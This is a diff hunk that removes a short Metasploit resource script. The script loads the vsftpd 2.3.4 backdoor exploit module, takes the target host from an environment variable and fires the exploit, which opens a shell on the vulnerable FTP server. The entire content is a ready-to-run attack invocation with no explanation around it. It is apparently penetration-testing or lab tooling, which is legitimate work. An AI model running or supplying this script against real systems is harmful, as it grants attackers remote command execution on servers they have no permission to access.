@@ -1,5 +1,0 @@
-use exploit/unix/ftp/vsftpd_234_backdoor
-<ruby>
-run_single("set RHOST #{ENV['RHOST']}")
-</ruby>
-exploit
